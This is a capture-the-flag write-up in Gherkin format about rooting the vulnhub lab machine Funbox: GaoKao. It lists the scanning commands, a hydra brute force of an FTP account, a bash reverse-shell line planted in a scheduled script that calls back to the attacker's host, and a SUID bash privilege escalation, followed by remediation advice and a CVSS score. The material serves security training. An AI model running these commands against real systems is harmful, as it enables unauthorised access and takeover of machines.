## Version 1.4.1
## language: en

Feature:
  TOE:
    vulnhub Funbox: GaoKao
  Location:
    192.168.1.137:21
  CWE:
    CWE-307: https://cwe.mitre.org/data/definitions/307.html
  Rule:
    REQ.014: https://docs.fluidattacks.com/criteria/vulnerabilities/014/
    REQ.053: https://docs.fluidattacks.com/criteria/vulnerabilities/053
    REQ.330: https://docs.fluidattacks.com/criteria/vulnerabilities/330
  Goal:
    Get root privileges and the root flag
  Recommendation:
    Use of common protection mechanisms

  Background:

  Hacker's software:
    | <Software name> | <Version>    |
    | Kali linux      | 5.10.28      |
    | Virtualbox      | 6.1.34       |
    | Firefox         | 91.9.0       |
    | Nmap            | 7.92         |
    | arp-scan        | 1.9.7        |
    | Gobuster        | 3.1.0        |
    | Hydra           | 9.3          |
  TOE information:
    Given a .ova file
    Then I ran the file in Virtualbox
    Then I could see the virtual machine was running [evidence](01.png)
    And the server is running FTP version ProFTPD 1.3.5e
    And SSH version OpenSSH 7.6p1
    And HTTP version Apache httpd 2.4.29
    And MYSQL version MySQL 5.7.34-Ubuntu

  Scenario: Normal use case
    Given access to a virtual server
    And a mac address [evidence](02.png)
    Then I execute the following commands:
    """
    $ nmap -sP 192.168.1.0/24
    $ sudo arp-scan -l | grep 08
    """
    When looking at the result [evidence](03.png)
    Then I decided to visit the website:
    """
    http://192.168.1.137/
    """
    When looking in the browser
    Then I just saw a welcome web page [evidence](04.png)

  Scenario: Dynamic detection
    Given an IPv4 address 192.168.1.137
    Then I ran a scan report
    And I execute the following command:
    """
    $ nmap -p- -sV -sC 192.168.1.137
    """
    Then I could see services and which ports are open [evidence](05.png)
    And I decided to explore the different ports
    Then I noted that port 22 was used by SSH
    And its version OpenSSH 7.6p1
    Then I noted that port 21 was used by FTP
    And its version 1.3.5e
    Then I noted that port 3306 was used by MYSQL
    And its version MySQL 5.7.34-Ubuntu
    Then I noted that port 80 was used by HTTP
    And its version Apache HTTPd 2.4.29
    When looking in the browser, I see a web page
    Then I decided to search possible hidden directories with gobuster
    And I execute the following command:
    """
    $ gobuster dir -u http://192.168.1.137
    -w /usr/share/wordlist/dirb/common.txt
    """
    Then I got the next result [evidence](06.png)
    When I checked, it was not something interesting
    Then I decided to search for files using the anonymous user on FTP
    And I execute the following command:
    """
    $ ftp 192.168.1.137
    """
    Then I noted that there was a user called "sky" [evidence](07.png)
    When looking at the challenge web page
    Then I saw some tips [evidence](08.png)
    Then I could conclude that I can use a force attack
    And exploit the improper authentication vulnerability

  Scenario: Exploitation
    Given the FTP service 192.168.1.137:21
    And the improper authentication vulnerability
    And the user called "sky"
    Then I could execute a brute force attack command using hydra on FTP
    Then I run the following command: [evidence](09.png)
    """
    $ hydra -l sky
    -P /usr/share/wordlists/metasploit/unix_passwords.txt
    ftp://192.168.1.137 -vV -f
    """
    When I got a positive response [evidence](10.png)
    Then I decided to search for files using the new user "sky" on FTP
    And I execute the following command using the given credentials:
    """
    $ ftp 192.168.1.137
    """
    Then I got the next result [evidence](11.png)
    When I checked, I got a script and a new user called "sarah"
    And that script could be a scheduled job
    Then I added the next line to the file: [evidence](12.png)
    """
    $ bash -c 'bash -i &> /dev/tcp/192.168.1.106/9000 0<&1'
    """
    Then I got a positive response
    And I become the "sarah" user [evidence](13.png)
    When I search for binaries that the user can access
    Then I run the following command: [evidence](14.png)
    """
    $ find / -perm -4000 -type f 2>/dev/null
    """
    Then I got the binaries including "/bin/bash"
    Then I search if that binary has the SUID bit selected
    Then I run the following command: [evidence](15.png)
    """
    $ find / -perm -4000 -exec ls -al {} \; 2>/dev/null
    """
    When I checked, it was something interesting
    Then I looked for a binary misconfigured from the following site:
    """
    https://gtfobins.github.io/
    """
    When I found the results
    Then I could see an option to escalate access [evidence](16.png)
    Then I got the next command:
    """
    $ bash -p
    """
    When I execute that command
    Then I become the root user [evidence](17.png)
    And I got the flag [evidence](18.png)

  Scenario: Remediation
    Given that the system has a vulnerability
    Then is necessary to use libraries with authentication capabilities
    And got a well-developed architectural security tactic and a correct design
    And Implementing a timeout
    And Disconnecting the user after a small number of failed attempts
    And disable insecure features such as misconfigured binaries
    Then I can confirm that the server is less vulnerable

  Scenario: Scoring
  Severity scoring according to CVSSv3 standard
  Base: Attributes that are constants over time and organizations
    7.5/10 (High) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/
  Temporal: Attributes that measure the exploit's popularity and fixability
    6.5/10 (Medium) - E:P/RL:O/RC:R
  Environmental: Unique and relevant attributes to a specific user environment
    6.5/10 (Medium) - CR:M/IR:M/AR:MM

  Scenario: Correlations
    No correlations have been found to this date 2022-07-19
